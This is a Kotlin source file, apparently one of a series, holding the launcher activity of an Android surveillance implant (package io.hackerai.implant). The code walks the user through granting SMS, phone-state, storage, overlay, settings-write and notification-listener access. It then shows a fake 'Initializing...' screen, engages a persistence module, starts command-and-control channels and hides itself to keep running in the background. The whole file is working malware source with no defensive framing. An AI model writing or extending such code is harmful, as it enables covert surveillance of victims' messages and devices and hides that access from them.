// ============================================================
// FILE 20: ui/MainActivity.kt (Kotlin)
// ============================================================
package io.hackerai.implant.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.hackerai.implant.R
import io.hackerai.implant.persist.PersistenceMatrix
import io.hackerai.implant.utils.PermUtils

/**
 * MainActivity — minimal launcher activity.
 *
 * On first launch:
 *   1. Requests all dangerous permissions
 *   2. Opens overlay/write-settings/exact-alarm permission settings
 *   3. Engages PersistenceMatrix
 *   4. Displays a fake "loading" screen then finishes
 *
 * On subsequent launches, immediately finishes (no visible UI).
 */
class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERM_REQ_CODE = 1001
        private const val OVERLAY_REQ_CODE = 1002
        private const val WRITE_SETTINGS_REQ_CODE = 1003
    }

    private var permsStep = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Start the Permission Grant Wizard
        runPermissionWizard()
    }

    private fun runPermissionWizard() {
        when (permsStep) {
            0 -> requestDangerousPerms()
            1 -> requestOverlayPermission()
            2 -> requestWriteSettings()
            3 -> requestExactAlarm()
            4 -> requestNotificationListener()
            5 -> engageAndFinish()
        }
    }

    private fun requestDangerousPerms() {
        val needed = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (checkSelfPermission(Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_SMS)
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.RECEIVE_SMS)
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (needed.isEmpty()) {
            permsStep++
            runPermissionWizard()
        } else {
            ActivityCompat.requestPermissions(
                this, needed.toTypedArray(), PERM_REQ_CODE
            )
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
            Settings.canDrawOverlays(this)) {
            permsStep++
            runPermissionWizard()
            return
        }
        val intent = Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:$packageName")
        )
        startActivityForResult(intent, OVERLAY_REQ_CODE)
    }

    private fun requestWriteSettings() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
            Settings.System.canWrite(this)) {
            permsStep++
            runPermissionWizard()
            return
        }
        val intent = Intent(
            Settings.ACTION_MANAGE_WRITE_SETTINGS,
            Uri.parse("package:$packageName")
        )
        startActivityForResult(intent, WRITE_SETTINGS_REQ_CODE)
    }

    private fun requestExactAlarm() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            permsStep++
            runPermissionWizard()
            return
        }
        val am = getSystemService(ALARM_SERVICE) as? android.app.AlarmManager
        if (am?.canScheduleExactAlarms() == true) {
            permsStep++
            runPermissionWizard()
            return
        }
        val intent = Intent(
            Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM,
            Uri.parse("package:$packageName")
        )
        startActivity(intent)
        // We can't track result easily; just advance
        permsStep++
        runPermissionWizard()
    }

    private fun requestNotificationListener() {
        // Open notification listener settings — user must toggle manually
        PermUtils.ensureNotificationListener(this)
        permsStep++
        runPermissionWizard()
    }

    private fun engageAndFinish() {
        Toast.makeText(this, "Initializing...", Toast.LENGTH_SHORT).show()

        // Engage persistence matrix
        PersistenceMatrix.getInstance(this).engage()

        // Start C2 channels
        io.hackerai.implant.comms.ChannelClient.getInstance(this).start()

        // Log permission state
        PermUtils.logPermissionState(this)

        // Finish activity — app continues in background as service
        finish()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERM_REQ_CODE) {
            permsStep++
            runPermissionWizard()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            OVERLAY_REQ_CODE, WRITE_SETTINGS_REQ_CODE -> {
                permsStep++
                runPermissionWizard()
            }
        }
    }
}
